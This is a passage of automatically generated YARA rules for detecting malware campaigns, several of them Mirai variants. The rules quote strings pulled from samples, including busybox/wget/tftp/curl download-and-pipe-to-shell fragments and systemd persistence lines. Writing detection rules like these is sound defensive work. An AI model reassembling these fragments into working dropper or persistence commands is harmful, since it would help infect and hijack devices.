        $s10 = "seqovl>=split_pos (%zu>=%zu). cancelling seqovl for part %d." ascii
        $s11 = "WARNING !!! in most cases this is acceptable only with custom payload based windivert filter (--wf-r" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 10 of them
}

rule Sightlines_tlsh_e7c06555_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e7c06555"
        date = "2026-10-31"
        campaign = "tlsh-e7c06555"
        family = ""
        hash = "2000912f2fc52e0c64ed893d79f4e7b143502540fb7170b5ae5fcea7099ba431"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e7c06555.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"false\"" ascii
        $s1 = "      <method signature=\"System.Boolean GetUsingResourceKeysSwitchValue()\" body=\"stub\" value=\"true\" " ascii
        $s2 = "      <method signature=\"System.Boolean UsingResourceKeys()\" body=\"stub\" value=\"false\" />" ascii
        $s3 = "/_/src/runtime/artifacts/obj/Microsoft.CSharp/Release/net10.0-windows/Microsoft.CSharp.pdb" ascii
        $s4 = "WThe 'dynamic' feature requires runtime-code generation, which is incompatible with AOT." ascii
        $s5 = "RepositoryUrl https://github.com/dotnet/dotnet" ascii
        $s6 = "Justification`We can't annotate static constructors on structs, but everything else in this type is " ascii
        $s7 = "__StaticArrayInitTypeSize=104_Align=4" ascii
        $s8 = "246FFE5A442AD743A5B5E3472C0ECADD52C388FA25D68953C6B26AB7B7983C674" ascii
        $s9 = "C93CEDF33C42465BF6B93ED66FC9147EFCDE83274B61A58782B4E323D343AE3B4" ascii
        $s10 = "BuiltInInteropVariantExtensions" ascii
        $s11 = "<7>__BindLiftedBoolBitwiseOp" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1962608 and 12 of them
}

rule Sightlines_tlsh_ec9ed83c_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ec9ed83c"
        date = "2026-11-01"
        campaign = "tlsh-ec9ed83c"
        family = ""
        hash = "29a9c09b499d757b5f5689a280658c5d8941da7039f415b2f01ce6993e3856c0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ec9ed83c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ShortcutDirectory_TargetHotkeyIcon_IconIndexShowCmdWkDirDisplayResourceDLLDisplayResourceIdDescripti" ascii
        $s1 = "MediaDiskIdLastSequenceDiskPromptCabinetVolumeLabelSource#cab1.cabAdminUISequenceActionConditionSequ" ascii
        $s2 = "SearchPropertySignature_UpgradeUpgradeCodeVersionMinVersionMaxLanguageAttributesRemoveActionProperty" ascii
        $s3 = "ypeStartTypeErrorControlLoadOrderGroupDependenciesStartNamePasswordArgumentsComponent_DescriptionApp" ascii
        $s4 = "enceCostInitializeFileCostCostFinalizeExecuteActionErrorMessageServiceInstallNameDisplayNameServiceT" ascii
        $s5 = "onResourceDLLDescriptionResourceIdInstallExecuteSequenceValidateProductIDInstallValidateInstallIniti" ascii
        $s6 = "alizeProcessComponentsUnpublishFeaturesRemoveRegistryValuesWriteRegistryValuesRegisterUserRegisterPr" ascii
        $s7 = "Installation Database" ascii
        $s8 = " !#+7DMNPUYadg{}" wide
        $s9 = "SummaryInformation" wide
        $s10 = "$hjlnprtvxzi" wide
        $s11 = "@H??wElDj;" ascii
    condition:
        filesize < 6980608 and 11 of them
}

rule Sightlines_imphash_34ef860b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-34ef860b"
        date = "2026-11-01"
        campaign = "imphash-34ef860b"
        family = ""
        hash = "4c53f3efa13abbfb3d49e3775b0ee53e4bff5287afdcc020d021006ef08fbaea"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-34ef860b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "%LOCALAPPDATA%\\RuneLite\\jre;C:\\Users\\%USERNAME%\\AppData\\Local\\RuneLite\\jre;C:\\Program Files\\RuneLite" ascii
        $s1 = "com/google/common/hash/AbstractNonStreamingHashFunction$ExposedByteArrayOutputStream.classPK" ascii
        $s2 = "ch/qos/logback/core/rolling/SizeAndTimeBasedFNATP$Usage.classPK" ascii
        $s3 = "ch/qos/logback/core/joran/action/NestedComplexPropertyIA$1.classPK" ascii
        $s4 = "com/google/common/collect/FilteredEntryMultimap$AsMap$1EntrySetImpl$1.classPK" ascii
        $s5 = "com/google/common/hash/Murmur3_128HashFunction$Murmur3_128Hasher.classPK" ascii
        $s6 = "com/google/common/hash/LittleEndianByteArray$UnsafeByteArray$1.classPK" ascii
        $s7 = "com/google/common/hash/LittleEndianByteArray$UnsafeByteArray$2.classPK" ascii
        $s8 = "com/google/common/hash/LittleEndianByteArray$UnsafeByteArray$3.classPK" ascii
        $s9 = "org/slf4j/helpers/BasicMDCAdapter$1.classPK" ascii
        $s10 = "com/google/common/hash/LittleEndianByteArray$JavaLittleEndianBytes$1.classPK" ascii
        $s11 = "com/google/common/collect/FilteredEntryMultimap$AsMap$1EntrySetImpl.classPK" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 5312762 and 12 of them
}

rule Sightlines_tlsh_adcd2461_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-adcd2461"
        date = "2026-11-01"
        campaign = "tlsh-adcd2461"
        family = "mirai"
        hash = "01e5360067eb757682085ff66939c7190edbcab62cd00153b1e10ff6be9945e8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-adcd2461.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/bin/busybox chmod +x .d; ./.d; ./dvrHelper selfrep" ascii
        $s1 = " -r tftp.sh -l- | sh;/bin/busybox ftpget " ascii
        $s2 = "/wget.sh -O- | sh;/bin/busybox tftp -g " ascii
        $s3 = " ftpget.sh ftpget.sh && sh ftpget.sh;curl http://" ascii
        $s4 = "\"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x6" ascii
        $s5 = "Content-Type: application/json" ascii
        $s6 = "/bin/busybox hostname PBOC" ascii
        $s7 = "GET /api/v1/status HTTP/1.1" ascii
        $s8 = "/bin/busybox wget http://" ascii
        $s9 = "POST /api/sync HTTP/1.1" ascii
        $s10 = "/bin/busybox echo -ne " ascii
        $s11 = "/bin/busybox echo > " ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_382cc36e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-382cc36e"
        date = "2026-11-01"
        campaign = "tlsh-382cc36e"
        family = "mirai"
        hash = "000764ec08dd7412613a6335337696010bdd7026ef61b26dd19ea5ac6cb7d7e4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-382cc36e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "qVcVf(@Vg= Vhm#Vi}&Vj" ascii
        $s4 = "qQSRVSWTXUYVZW[" ascii
        $s5 = "BcAR2a3f&g" ascii
        $s6 = "/s`miCWDX" ascii
        $s7 = "509=:efg`" ascii
        $s8 = "g3amA|1Qf" ascii
        $s9 = "h.d^cba|1" ascii
        $s10 = "5::=1fdef" ascii
        $s11 = ".-50efg`" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_83ffefec_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-83ffefec"
        date = "2026-11-01"
        campaign = "tlsh-83ffefec"
        family = "mirai"
        hash = "191c0859e16a94f0188276105ba5d1c07d3db578a994da12f4f876a66dc150b8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-83ffefec.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $" ascii
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $" ascii
        $s2 = "(!PROT_EXEC|PROT_WRITE failed." ascii
        $s3 = "hW;U`Do4R" ascii
        $s4 = "M~Lp2QRff" ascii
        $s5 = "6X@f/NGH" ascii
        $s6 = "DT|UEJlC" ascii
        $s7 = "Ztg6k\"fJ" ascii
        $s8 = "&ZZDJ8}1" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_tlsh_22bcefa9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-22bcefa9"
        date = "2026-11-01"
        campaign = "tlsh-22bcefa9"
        family = "mirai"
        hash = "065092a744c8d49931a99771e831b38d86c3b344f5c0221ac9d3de18d9837163"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-22bcefa9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = " /x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9" ascii
        $s2 = "A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9" ascii
        $s3 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s4 = "?/dev/null" ascii
        $s5 = "509=:efg`" ascii
        $s6 = "5::=1fdef" ascii
        $s7 = ".-50efg`" ascii
        $s8 = "$662*7!E" ascii
        $s9 = "7<5:3191" ascii
        $s10 = "}CSx}e[x" ascii
        $s11 = "}e[x}CSx" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_da99e2f6_silentnet
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-da99e2f6"
        date = "2026-11-01"
        campaign = "imphash-da99e2f6"
        family = "silentnet"
        hash = "0b349a5b1a1d1d40b3fbaf1a794c94f569770ce5a9a4bdf8cbeb198627a9da12"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-da99e2f6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Unable to dump stack trace: debug info stripped" ascii
        $s1 = "CertificateSignatureAlgorithmUnsupported" ascii
        $s2 = "CertificateSignatureNamedCurveUnsupported" ascii
        $s3 = "CertificateSignatureUnsupportedBitCount" ascii
        $s4 = "CertificateSignatureAlgorithmMismatch" ascii
        $s5 = "getrandom() failed to provide entropy" ascii
        $s6 = "TlsAlertBadCertificateStatusResponse" ascii
        $s7 = "CertificateHasUnrecognizedObjectId" ascii
        $s8 = "Panicked during a panic. Aborting." ascii
        $s9 = "CertificateFieldHasWrongDataType" ascii
        $s10 = "CertificateSignatureInvalidLength" ascii
        $s11 = "CertificateAuthorityBundleTooBig" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2279424 and 12 of them
}

rule Sightlines_tlsh_913890e0_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-913890e0"
        date = "2026-11-01"
        campaign = "tlsh-913890e0"
        family = "mirai"
        hash = "0ad07ef254e4aa14d108354f84fc4dfc27754b5e6f7de54ecd877466b4978bd5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-913890e0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "cat > \"$d/network-dispatch.service\" <<EOF" ascii
        $s1 = "ln -sf \"$d/network-dispatch.service\" \"$d/multi-user.target.wants/network-dispatch.service\"" ascii
        $s2 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s3 = "/root/.config/systemd/user/network-dispatch.service" ascii
        $s4 = "/etc/udev/rules.d/99-network-dispatch.rules" ascii
        $s5 = "Cache-Control: no-cache, no-store, must-revalidate" ascii
        $s6 = "option post_install_hook /etc/init.d/network-dispatch" ascii
        $s7 = "Noise_IKpsk2_25519_ChaChaPoly_BLAKE2s" ascii
        $s8 = "rc_startup=/etc/init.d/network-dispatch start" ascii
        $s9 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
        $s10 = "/etc/xdg/autostart/network-dispatch.desktop" ascii
        $s11 = "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_e6af6a6f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e6af6a6f"
        date = "2026-11-01"
        campaign = "tlsh-e6af6a6f"
        family = ""
        hash = "27c57e4177730efd7b7c8e3875fdd2c2d45a72c801bd131d617f4228075ebddb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e6af6a6f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s1 = "/etc/config/resolv.conf" ascii
        $s2 = "nd 3expa2-byte k" ascii
        $s3 = "/etc/config/hosts" ascii
        $s4 = ".comment" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 5 of them
}

rule Sightlines_tlsh_9b4b1d7a_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9b4b1d7a"
        date = "2026-11-01"
        campaign = "tlsh-9b4b1d7a"
        family = "mirai"
        hash = "3e8de9edafa71f4399820fb5ea8785041807b9300ab0a9739d0bb49cca03dd01"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9b4b1d7a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s2 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s3 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr" ascii
        $s4 = "HOST: 255.255.255.255:1900" ascii
        $s5 = "MAN: \"ssdp:discover\"" ascii
        $s6 = "M-SEARCH * HTTP/1.1" ascii
        $s7 = "service:service-agent" ascii
        $s8 = "/lib/ld-uClibc.so.0" ascii
        $s9 = "__aeabi_uidivmod" ascii
        $s10 = "__errno_location" ascii
        $s11 = "__uClibc_main" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_2e6d78d4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-2e6d78d4"
        date = "2026-11-01"
        campaign = "tlsh-2e6d78d4"
        family = ""
        hash = "359298d5e70b0bdcd2d9bed785ce95f8fd84674ac7883af4de3487b0ed1ca081"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-2e6d78d4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "L$v8\\$vt*8Y" ascii
        $s1 = "T$v8\\$vt?8Z" ascii
        $s2 = "t$XfD9+t#" ascii
        $s3 = "tzfD9 ttH" ascii
        $s4 = "tZ;|$0tM" ascii
        $s5 = "H9D$HtTH" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 6 of them
}

rule Sightlines_imphash_42bb09ec_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-42bb09ec"
        date = "2026-11-01"
        campaign = "imphash-42bb09ec"
        family = ""
        hash = "54cd4a919663f089dadd9e8359ce44bb44d75b2914445ac2a128d046dae03e56"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-42bb09ec.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "api-ms-win-core-winrt-error-l1-1-0.dll" ascii
        $s1 = "api-ms-win-crt-private-l1-1-0.dll" ascii
        $s2 = "MFCreateSourceReaderFromMediaSource" ascii
        $s3 = "SetupDiGetClassDevsW" ascii
        $s4 = "MFEnumDeviceSources" ascii
        $s5 = "CreateDXGIFactory1" ascii
        $s6 = "RoOriginateErrorW" ascii
        $s7 = "mfreadwrite.dll" ascii
        $s8 = "IsUserAnAdmin" ascii
        $s9 = "setupapi.dll" ascii
        $s10 = "rstrtmgr.dll" ascii
        $s11 = "NtOpenFile" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 4812800 and 12 of them
}

rule Sightlines_tlsh_75cd0115_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-75cd0115"
        date = "2026-10-31"
        campaign = "tlsh-75cd0115"
        family = ""
        hash = "2afac64b76f74e0312ece225edab6176e690ed0a9c0598c863008ffdee49b33b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-75cd0115.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "# Required-Stop: $network $remote_fs $syslog" ascii
        $s1 = "# Required-Start: $network $remote_fs $syslog" ascii
        $s2 = "    echo \"Usage: $0 {start|stop|restart}\"" ascii
        $s3 = "# Short-Description: nyx-agent bot" ascii
        $s4 = "# Default-Start: 2 3 4 5" ascii
        $s5 = "# Provides: nyx-agent" ascii
        $s6 = "# Default-Stop: 0 1 6" ascii
        $s7 = "### BEGIN INIT INFO" ascii
        $s8 = "### END INIT INFO" ascii
        $s9 = "  restart)" ascii
        $s10 = "  start)" ascii
    condition:
        filesize < 1048576 and 11 of them
}

rule Sightlines_imphash_40578992_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-40578992"
        date = "2026-10-31"
        campaign = "imphash-40578992"
        family = ""
        hash = "1134b8284dc1a434cf004e3ad7a1dd025c81b1a6aa265cad2118448d0419b63d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-40578992.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s1 = "Invoking fx resolver [%s] hostfxr_main_bundle_startupinfo" wide
        $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" ascii
        $s3 = "D:\\a\\_work\\1\\s\\src\\runtime\\artifacts\\obj\\win-x64.Release\\corehost\\apphost\\standalone\\apphost.pdb" ascii
        $s4 = "The required library %s could not be found. Search location options [0x%x]" wide
        $s5 = "CreateActCtxW failed using manifest '%s'. Error code: %d" wide
        $s6 = "Invoking fx resolver [%s] hostfxr_main_startupinfo" wide
        $s7 = "Showing error dialog for application: '%s' - error code: 0x%x - url: '%s' - details: %s" wide
        $s8 = "gThe app-relative .NET path is longer than the max allowed length (%d)" wide
        $s9 = "Bundle header version compatibility check failed." wide
        $s10 = "The managed DLL bound to this executable is: '%s'" wide
        $s11 = "Error: [%s] does not contain any version-numbered child folders" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1165312 and 12 of them
}

rule Sightlines_tlsh_21a8b41b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-21a8b41b"
        date = "2026-10-31"
        campaign = "tlsh-21a8b41b"
        family = ""
        hash = "2e6bf792d54303a54467102fd873a7d7a993f828e8d19c040e13e428e5f2d9c8"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-21a8b41b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "JSON parsing exception: %s [offset %zu: line %d, column %d]" wide
        $s1 = "Unable to open specified trace file for writing: %s" wide
        $s2 = "  - Ensure the library matches the current process architecture: x64" wide
        $s3 = "Failed to load [%s], HRESULT: 0x%X" wide
        $s4 = "Framework '%s' is missing a version." wide
        $s5 = "No framework name specified: %s" wide
        $s6 = "Failed to parse file [%s]. %s" wide
        $s7 = "Expected a JSON object" wide
        $s8 = "TRACE_VERBOSITY" wide
        $s9 = "DOTNET_HOST_%s" wide
        $s10 = "COREHOST_%s" wide
        $s11 = "t6<0|o<9wk" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_5c7707f1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5c7707f1"
        date = "2026-10-31"
        campaign = "tlsh-5c7707f1"
        family = ""
        hash = "23a8050ec68542989b6da6cc906a90faf8a14e6416fd2871a260b781b1c374ae"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5c7707f1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Reserving %zd bytes (%.3f mb) for GC bookkeeping failed" ascii
        $s1 = "ParseGCHeapAffinitizeRange failed, check your HeapAffinitizeRanges config" ascii
        $s2 = "This process is affinitize to 0 CPUs, check your GC heap affinity related configs" ascii
        $s3 = "compute_hard_limit failed, check your heap hard limit related configs" ascii
        $s4 = "Committing %zd bytes for a region failed" ascii
        $s5 = "System.GC.UOHWaitBGCSizeIncPercent" ascii
        $s6 = "System.GC.DGen0GrowthMaxFactor" ascii
        $s7 = "System.GC.DGen0GrowthMinFactor" ascii
        $s8 = "System.GC.DGen0GrowthPercent" ascii
        $s9 = "System.GC.Gen0MaxBudget" ascii
        $s10 = "System.GC.LOHThreshold" ascii
        $s11 = "GCCacheSizeFromSysConf" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1422928 and 12 of them
}

rule Sightlines_tlsh_60665380_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-60665380"
        date = "2026-11-01"
        campaign = "tlsh-60665380"
        family = ""
        hash = "0d6b4f7558a1b820378140d3a59b25972dfb70d40d5cccacbad56e60bc24fa93"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-60665380.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "IcL$dIcT$`Mct$TL" ascii
        $s1 = "L$8AkL$t&Mc" ascii
        $s2 = "t$0L;p ~kH" ascii
        $s3 = "D$`H9D$huGH" ascii
        $s4 = "d$XL;d$`tTL" ascii
        $s5 = "4$L9p s\\H" ascii
        $s6 = "AUATUSRH9" ascii
        $s7 = "D$XH9D$`u" ascii
        $s8 = "D$`H9D$ht" ascii
        $s9 = "L$ IcL$tH" ascii
        $s10 = "t\"H9S(t%H" ascii
        $s11 = "tFH9w w@H" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_f019c216_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f019c216"
        date = "2026-11-01"
        campaign = "tlsh-f019c216"
        family = ""
        hash = "44746262b132edfa0a8e69e254bca4d273c7349b655d527bf44b7d83d1da4342"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f019c216.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".?AV?$CArqSessionT@VCUdpSocket@@V1@@@" ascii
        $s1 = "input ack: sn=%lu rtt=%ld rto=%ld" ascii
        $s2 = "input psh: sn=%lu ts=%lu" ascii
        $s3 = ".?AVCKernelManager@@" ascii
        $s4 = ".?AVISocketBase@@" ascii
        $s5 = ".?AVCUdpSocket@@" ascii
        $s6 = ".?AVCTcpSocket@@" ascii
        $s7 = "[RO] %ld bytes" ascii
        $s8 = "input wins: %lu" ascii
        $s9 = ".?AVCManager@@" ascii
        $s10 = "[RI] %d bytes" ascii
        $s11 = ".?AVCBuffer@@" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_11b509fa_ladvix
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-11b509fa"
        date = "2026-11-01"
        campaign = "tlsh-11b509fa"
        family = "ladvix"
        hash = "01d5ce95105ec120abf4e9369b32040a01e93e0e5de533c4d5cdb9b52d50da82"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-11b509fa.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<>@o$:,.l+*^?=)(|AB&%;D{!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][" ascii
        $s1 = "program_invocation_short_name" ascii
        $s2 = "obstack_alloc_failed_handler" ascii
        $s3 = "/lib64/ld-linux-x86-64.so.2" ascii
        $s4 = "_ITM_deregisterTMCloneTable" ascii
        $s5 = "_ITM_registerTMCloneTable" ascii
        $s6 = "Ym9uZ3JpcHo0amV6dXoK" ascii
        $s7 = "program_invocation_name" ascii
        $s8 = "__ctype_get_mb_cur_max" ascii
        $s9 = "_obstack_memory_used" ascii
        $s10 = "_obstack_allocated_p" ascii
        $s11 = "__isoc23_strtoumax" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_ca006e52_ladvix
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ca006e52"
        date = "2026-11-01"
        campaign = "tlsh-ca006e52"
        family = "ladvix"
        hash = "1a00edbe089690d8592264a94d3be8daf3391395d7798879b66eb6dea611a566"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ca006e52.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "<>@o$:,.l+*^?=)(|AB&%;D{!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][" ascii
        $s1 = "program_invocation_short_name" ascii
        $s2 = "obstack_alloc_failed_handler" ascii
        $s3 = "/lib64/ld-linux-x86-64.so.2" ascii
        $s4 = "_ITM_deregisterTMCloneTable" ascii
        $s5 = "_ITM_registerTMCloneTable" ascii
        $s6 = "Ym9uZ3JpcHo0amV6dXoK" ascii
        $s7 = "program_invocation_name" ascii
        $s8 = "__ctype_get_mb_cur_max" ascii
        $s9 = "_obstack_memory_used" ascii
        $s10 = "_obstack_allocated_p" ascii
        $s11 = "__isoc23_strtoumax" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_signer_cert_sha1_129a4e87_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-129a4e87"
        date = "2026-11-01"
        campaign = "signer_cert_sha1-129a4e87"
        family = ""
        hash = "16ba0a0c46865990f3953a95546eeb4b1c825f4b9d1db6e5ba414966bf023817"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-129a4e87.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Ohttp://www.microsoft.com/pkiops/crl/Microsoft%20Code%20Signing%20PCA%202024.crl0m" ascii
        $s1 = "Qhttp://www.microsoft.com/pkiops/certs/Microsoft%20Code%20Signing%20PCA%202024.crt0" ascii
        $s2 = "Microsoft Code Signing PCA 20240" ascii
        $s3 = "Copyright Microsoft Corporation" wide
        $s4 = "https://www.microsoft.com 0" ascii
        $s5 = "*Microsoft Edge Updat" wide
        $s6 = "Microsoft Edge Update" wide
        $s7 = "UpstreamVersion" wide
        $s8 = "msedgeupdate.dll" wide
        $s9 = "360322221304Z0W1" ascii
        $s10 = "270415190011Z0t1" ascii
        $s11 = "230217+5075580" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 11 of them
}

rule Sightlines_tlsh_194fe1e6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-194fe1e6"
        date = "2026-11-01"
        campaign = "tlsh-194fe1e6"
        family = ""
        hash = "335a02dfe9bb67f7351d038d6527c7f6467e08d0173e49a88733ebfa30d7aaa7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-194fe1e6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "      <!--<supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\" />-->" ascii
        $s2 = "      <!--<supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\" />-->" ascii
        $s3 = "      <!--<supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\" />-->" ascii
        $s4 = "      <!--<supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\" />-->" ascii
        $s5 = "      <!--<supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\" />-->" ascii
        $s6 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s7 = "<assembly manifestVersion=\"1.0\" xmlns=\"urn:schemas-microsoft-com:asm.v1\">" ascii
